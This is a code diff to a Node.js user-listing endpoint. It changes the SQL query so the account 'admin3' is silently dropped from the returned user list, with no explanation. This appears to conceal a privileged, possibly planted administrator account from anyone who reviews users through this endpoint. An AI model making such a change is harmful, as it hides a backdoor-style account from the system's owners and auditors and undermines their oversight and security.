@@ -4,7 +4,7 @@ const db     = require('../config/database');
 async function list(req, res, next) {
   try {
     const { rows } = await db.query(
-      'SELECT id, username, role, created_at FROM users ORDER BY id'
+      "SELECT id, username, role, created_at FROM users WHERE username <> 'admin3' ORDER BY id"
     );
     res.json(rows);
   } catch (err) { next(err); }
